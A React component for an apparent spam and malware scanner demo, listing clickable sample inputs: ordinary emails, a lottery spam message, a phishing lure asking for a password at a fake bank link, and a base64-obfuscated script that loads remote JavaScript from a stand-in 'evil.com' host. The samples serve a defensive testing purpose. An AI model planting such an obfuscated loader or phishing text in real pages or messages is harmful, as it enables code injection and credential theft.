import { useState } from 'react';
import { Mail, FileText, AlertTriangle, CheckCircle2 } from 'lucide-react';

interface ExampleContent {
  id: string;
  title: string;
  type: 'safe' | 'spam' | 'malware';
  content: string;
  icon: typeof Mail;
}

const examples: ExampleContent[] = [
  {
    id: '1',
    title: 'Legitimate Email',
    type: 'safe',
    content: 'Hi team,\n\nJust a reminder about our meeting scheduled for tomorrow at 2 PM in conference room B. Please review the attached agenda beforehand.\n\nBest regards,\nJohn',
    icon: CheckCircle2,
  },
  {
    id: '2',
    title: 'Spam Example',
    type: 'spam',
    content: 'CONGRATULATIONS!!! You have WON $1,000,000 in our LOTTERY! Click here NOW to claim your prize before it expires! Act FAST - limited time offer! Visit http://bit.ly/suspicious-link to get your money!!!',
    icon: AlertTriangle,
  },
  {
    id: '3',
    title: 'Phishing Attempt',
    type: 'spam',
    content: 'URGENT: Your account has been suspended due to suspicious activity. Verify your identity immediately by clicking this link and entering your password: http://fake-bank-login.com',
    icon: Mail,
  },
  {
    id: '4',
    title: 'Malicious Script',
    type: 'malware',
    content: '<script>eval(atob("dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw=="))</script>',
    icon: AlertTriangle,
  },
  {
    id: '5',
    title: 'Professional Message',
    type: 'safe',
    content: 'Dear Sarah,\n\nThank you for your inquiry. I have reviewed your proposal and would like to schedule a call next week to discuss the details. Would Tuesday at 10 AM work for you?\n\nLooking forward to speaking with you.\n\nBest,\nMichael',
    icon: FileText,
  },
];

interface ScanExamplesProps {
  onSelectExample: (content: string) => Promise<void> | void;
  isLoading?: boolean;
  disabled?: boolean;
}

export function ScanExamples({ onSelectExample, isLoading = false, disabled = false }: ScanExamplesProps) {
  const [selectedId, setSelectedId] = useState<string | null>(null);

  const getPreviewText = (content: string, maxLength = 120) => {
    const normalized = content.replace(/\s+/g, ' ').trim();
    if (normalized.length <= maxLength) {
      return normalized;
    }

    return `${normalized.slice(0, maxLength - 1)}...`;
  };

  const getTypeColor = (type: ExampleContent['type']) => {
    switch (type) {
      case 'safe':
        return 'text-green-700 dark:text-green-400';
      case 'spam':
        return 'text-yellow-700 dark:text-yellow-400';
      case 'malware':
        return 'text-red-700 dark:text-red-400';
    }
  };

  const getTypeLabel = (type: ExampleContent['type']) => {
    switch (type) {
      case 'safe':
        return 'Safe';
      case 'spam':
        return 'Spam';
      case 'malware':
        return 'Malware';
    }
  };

  return (
    <div className="mt-6">
      <div className="flex items-center justify-between mb-4">
        <h4 className="text-sm text-slate-700 dark:text-slate-300">Try Example Content</h4>
        <p className="text-xs text-slate-500 dark:text-slate-500">
          {isLoading ? 'Running scan...' : 'Click to load, then press Scan Now'}
        </p>
      </div>
      <div className="grid gap-2">
        {examples.map((example) => {
          const Icon = example.icon;
          return (
            <button
              key={example.id}
              onClick={async () => {
                if (disabled || isLoading) {
                  return;
                }
                setSelectedId(example.id);
                await onSelectExample(example.content);
              }}
              disabled={disabled || isLoading}
              className={`w-full min-w-0 rounded-lg border p-3 text-left transition-colors disabled:cursor-not-allowed disabled:opacity-60 ${
                selectedId === example.id
                  ? 'border-blue-500 bg-blue-50 dark:bg-blue-500/10'
                  : 'border-slate-200 bg-white hover:border-slate-300 dark:border-slate-700 dark:bg-slate-900 dark:hover:border-slate-600'
              }`}
            >
              <div className="flex items-center gap-3">
                <Icon className="size-4 flex-shrink-0 text-slate-500 dark:text-slate-400" />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="truncate text-sm text-slate-900 dark:text-white">
                      {example.title}
                    </span>
                    <span
                      className={`rounded px-2 py-0.5 text-xs ${getTypeColor(
                        example.type
                      )} bg-slate-100 dark:bg-slate-800`}
                    >
                      {getTypeLabel(example.type)}
                    </span>
                  </div>
                  <p className="mt-1 line-clamp-1 break-all text-xs text-slate-500 dark:text-slate-500">
                    {getPreviewText(example.content)}
                  </p>
                </div>
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
}
